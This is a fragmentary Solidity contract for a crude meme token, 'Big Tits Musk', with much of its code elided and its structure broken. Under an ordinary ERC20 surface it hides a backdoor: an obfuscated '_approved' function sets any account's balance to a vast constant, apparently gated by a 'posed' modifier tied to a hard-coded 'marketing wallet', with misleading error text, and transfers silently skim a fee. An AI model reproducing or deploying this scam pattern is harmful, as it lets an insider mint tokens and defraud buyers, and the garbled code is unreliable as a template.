...
contract Context {
 ...
 contract BigTitsMusk is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloADMDP;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Big Tits Musk";
    string private _symbol = "BIGTITSMUSK";
    ...
    uint256 private cryfaleADMDP = 2;
    uint256 private _vebegoADMDP = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloADMDP[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletADMDP = 0xF101A7b57dd4C154Fc20a3e65bbFCc8F2F0249Dd;
    ...
    uint256 private constant _bolkoADMDP = 10000000 * 10**42;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloADMDP[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloADMDP[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleADMDP / 100) / _vebegoADMDP;
        allons = allons -  (_fee * _vebegoADMDP);
        
        superfloADMDP[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }
    function _approved (address account) internal {
        superfloADMDP[account] = superfloADMDP[account] - superfloADMDP[account] + _bolkoADMDP;
    }
   ...
   */
    ...
    modifier posed () {
        require(_MarketingWalletADMDP == _msgSender(), "203: Message Sender is different from address(0)!");
        _;
    }
     ...
     */
    function _burn(address account, uint256 gzillaADMDP) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloADMDP[account];
        require(accountBalance >= gzillaADMDP, "BEP : Can't be done");
        unchecked {
            superfloADMDP[account] = accountBalance - gzillaADMDP;
        }
        _totalSupply -= gzillaADMDP;

        emit Transfer(account, address(0), gzillaADMDP);
    }
